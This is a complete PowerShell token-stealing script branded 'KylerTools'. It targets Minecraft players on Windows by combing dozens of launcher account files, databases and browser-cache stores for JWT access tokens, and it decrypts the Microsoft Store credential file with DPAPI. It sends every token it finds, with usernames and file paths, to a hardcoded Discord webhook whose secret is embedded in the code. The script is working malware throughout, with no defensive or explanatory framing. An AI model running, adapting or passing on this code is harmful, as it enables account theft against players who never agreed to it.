$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit" }
$h = @{ "Content-Type" = "application/json" }
Add-Type -AssemblyName System.Security -EA 0
try{ $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json; iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 8 -EA 0 | Out-Null }catch{}

$found = @()
$seen = @{}
$nl = [char]10
$bt3 = [char]96 + [char]96 + [char]96
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok, $user, $src, $type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User = $user; Type = $type; Token = $tok; File = $src }
}

function Scan-Text {
    param($text, $src, $user)
    if(-not $text){ return }
    $ms = [regex]::Matches($text, $jwtRegex)
    foreach($m in $ms){
        $val = [string]$m.Value
        if([string]::IsNullOrEmpty($val)){ continue }
        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $val $user $src "accessToken"
    }
}

function Scan-File {
    param($path, $user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            $stack = New-Object System.Collections.Stack
            $stack.Push($j)
            while($stack.Count -gt 0){
                $node = $stack.Pop()
                if($null -eq $node){ continue }
                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($item in $node){ $stack.Push($item) }; continue }
                if($node -isnot [PSCustomObject]){ continue }
                $uname = "unknown"
                foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
                if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                foreach($k in @("accessToken","token","access_token")){ if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" } }
                foreach($prop in $node.PSObject.Properties){
                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path, $user)
    if(-not (Test-Path $path)){ return }
    try{
        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
        $ms = New-Object IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray())
        Scan-Text $txt $path $user
    }catch{}
}

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.minecraft\VaultKey\accounts.json",
    "$env:APPDATA\.minecraft\VaultKey\profiles.json",
    "$env:APPDATA\.minecraft\VaultKey\msa.json",
    "$env:APPDATA\.minecraft\VaultKey\auth.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json",
    "$env:APPDATA\.minecraft\LabyMod\accounts.json",
    "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
    "$env:APPDATA\.ATLauncher\accounts.json",
    "$env:APPDATA\.minecraft\tl_accounts.json",
    "$env:APPDATA\HMCL\accounts.json",
    "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $bytes = [IO.File]::ReadAllBytes($bin)
        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
        $txt = [Text.Encoding]::UTF8.GetString($dec)
        Scan-Text $txt $bin "unknown"
    }catch{}
}

$roots = @("$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp","$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl","$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon","$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL")
$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        $files = Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0
        foreach($f in $files){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$profileRoots = @("$env:APPDATA\PrismLauncher\instances","$env:APPDATA\MultiMC\instances","$env:APPDATA\.minecraft\config","$env:APPDATA\.minecraft\versions")
foreach($pr in $profileRoots){
    if(-not (Test-Path $pr)){ continue }
    try{
        $files = Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0
        foreach($f in $files){ if($f.Length -gt 1mb){ continue }; Scan-File $f.FullName "unknown" }
    }catch{}
}

$modrinthRoot = "$env:APPDATA\ModrinthApp"
if(Test-Path $modrinthRoot){
    $profilesDir = "$modrinthRoot\profiles"
    if(Test-Path $profilesDir){
        $dirs = Get-ChildItem $profilesDir -Directory -EA 0
        foreach($d in $dirs){
            $cfg = Join-Path $d.FullName "config"
            if(-not (Test-Path $cfg)){ continue }
            $files = Get-ChildItem $cfg -Recurse -File -Include "minecraft_auth.json","accounts.json","opsec-accounts.json","*.auth.json" -EA 0
            foreach($f in $files){ if($f.Length -gt 1mb){ continue }; Scan-File $f.FullName "unknown" }
        }
    }
}

$dbs = @("$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm","$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal","$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db")
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$webcaches = @("$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb","$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb","$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb")
foreach($lc in $webcaches){
    if(-not (Test-Path $lc)){ continue }
    try{
        $files = Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50
        foreach($f in $files){
            try{ $b = [IO.File]::ReadAllBytes($f.FullName); $s = [Text.Encoding]::UTF8.GetString($b); Scan-Text $s $f.FullName "unknown" }catch{}
        }
    }catch{}
}

function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{
        title = $title
        description = $bt3 + $desc + $bt3
        color = $color
        timestamp = (Get-Date).ToString("o")
    }
    if($footerText){ $embed.footer = @{ text = $footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    for($i = 0; $i -lt 2; $i++){
        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
        catch{
            $wait = 3
            try{ $ra = $_.Exception.Response.Headers['Retry-After']; if($ra){ $wait = [double]$ra } }catch{}
            Start-Sleep -Seconds ($wait + 1)
        }
    }
}

if($found.Count -eq 0){
    $joined = "nothin found bro"
} else {
    $lines = @()
    $i = 0
    foreach($t in $found){
        $i++
        $block = @()
        $block += $bt3 + "ansi"
        $block += "[ " + $i + " ] " + $t.User
        $block += "Type: " + $t.Type
        $block += "Token: " + $t.Token
        $block += "File: " + $t.File
        $block += $bt3
        $lines += ($block -join $nl)
    }
    $joined = $lines -join $nl
}

$limit = 1700
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){ $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i)) }

$n = 0
foreach($c in $chunks){
    $n++
    Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
    Start-Sleep -Seconds 2
}
